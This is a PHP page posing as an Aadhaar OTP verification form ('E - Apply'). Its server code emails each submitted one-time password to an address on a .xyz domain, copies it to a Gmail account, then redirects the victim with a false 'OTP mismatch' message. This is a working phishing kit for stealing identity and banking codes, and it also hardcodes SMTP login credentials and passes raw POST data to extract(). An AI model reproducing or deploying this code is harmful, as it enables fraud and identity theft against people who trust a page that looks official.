<?php
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
$msg="";
extract($_POST);
session_start();
if(isset($_POST['submit'])){
                $mail = new PHPMailer();
                $mail->SMTPDebug = SMTP::DEBUG_SERVER;
                $mail->isSMTP();
                $mail->Host = "smtp.hostinger.com";
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->Username = "info@pgi-bil-pgidsk-pgrs-crd-jsph.xyz";
                $mail->Password = "Admin@123";
                $mail->AddAddress("info@pgi-bil-pgidsk-pgrs-crd-jsph.xyz");
                $mail->addCC('easymailid45@gmail.com');
                $mail->SetFrom($mail->Username);
                
                $mail->isHTML(true);
                $mail->Subject   = 'Enquiry';
                
                     $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                               <p><b>OTP</b> - '.$otp.'</p>';
                
                if(!($mail->Send()))
                {
                   // $_SESSION['msg'] = "<p style = 'color:red;'>OTP mismatch</p>";
                   //      header("Location:adhar-otp2.php");    
                    $msg="<div class='alert alert-danger'><span><b>Warning! </b>All fields are mandatory</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";   
                }
                else
                {     
                        $_SESSION['msg'] = "<p style = 'color:red;'>OTP mismatch</p>";
                        header("Location:loader1.php");    
                     
                }           
    
  
}
?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>E - Apply</title>
  <link rel="stylesheet" href="./style.css">
<style type="text/css">
form p {
  font-size: 120%;
}
input[type=text]{
  margin: 0 0 0px 0 !important;
}
.input-field{
  margin-top: 4px !important;
}
[type="checkbox"]{
  color: #02b1f2 !important;
}
input[type=text]{
  border-bottom: 1px solid #C9000F !important;
}
button{
  width: 100%;
  border-radius: 10px !important;
  font-size: 16px !important; 
  background: #6FB74A !important;
}
.ctrlqFormContent {
  color: rgba(0,0,0,.87);
  padding: 10px;
}

.ctrlqFormContentWrapper {
  display: -webkit-box;
  display: -moz-box;
  display: -webkit-flex;
  display: -ms-flexbox;
  display: flex;
  -webkit-box-orient: vertical;
  box-orient: vertical;
  -webkit-flex-direction: column;
  flex-direction: column
}
input[type=text].valid: focus{
  box-shadow: none !important;
}
input[type=text].valid{
      border-bottom: 1px solid #26a69a !important;
    box-shadow: none !important;
}
.ctrlqCenteredContent {
  margin: auto;
  width: 600px; 
}
.ctrlqHeaderTitle {
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  font-size: 34px;
  line-height: 135%;
  max-width: 100%;
  min-width: 0%;
  margin-bottom: 22px
}

@media (max-width: 660px) {
  .ctrlqHeaderMast {
    height: 53px;
  }
  .ctrlqFormCard:first-of-type {
    margin-top: -50px;
  }

  .ctrlqCenteredContent {
    width: 100%;
  }
}

div.error {
  position: relative;
  top: -1rem;
  left: 0rem;
  font-size: 0.8rem;
  color: #FF4081;
  -webkit-transform: translateY(0%);
  -ms-transform: translateY(0%);
  -o-transform: translateY(0%);
  transform: translateY(0%);
}
button {
  letter-spacing: 0 !important;
  text-transform: inherit !important;
}

input[type=text].valid+label:after, input[type=text]:focus.valid+label:after{
  color: #C9000F !important;
}
input[type=text]:focus:not([readonly]){
  border-bottom: 1px solid #C9000F !important; 
}
</style>
</head>
<body>
<!-- partial:index.partial.html -->
<lhtml>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/css/materialize.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <title>Adhaar OTP</title>
  </head>
  <body>
    <div class="ctrlqFormContentWrapper">
      <div class="ctrlqHeaderMast"></div>
      <div class="ctrlqCenteredContent">
        <div class="ctrlqFormCard">
          <div class="ctrlqFormContent">

            <form method = "post">  
              <div class="row">
                <div class="col s12">
                  <br>
                  <p style="color: #C9000F;">Enter Aadhaar OTP/TOTP</p>
                  <small style="font-size: 14px;">A 6 digit One-Time password has been sent from your Aadhaar card to the registered mobile number.</small>
                </div>
              </div>

              <div class="row">
                <div class="input-field col s12">
                  <input required="" name="otp" type="text" class="validate" maxlength = "6">
                  <label style="color: #C9000F;" for="name">Enter OTP/TOTP</label>
                </div>
              </div>

              <div class="row">
                <div class="input-field col s12">
                  <button  type="submit" name = "submit" style="color: #fff; padding: 8px; border: none; width: 80%; margin-left: 10%;">Submit OTP & Proceed</button>
                </div>
              </div>

            </form>
            <!-- <p>3. Current Residential Address</p> -->
          </div>
        </div>
      </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/js/materialize.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.min.js"></script>

  </body>

  </html>
</body>
</html>
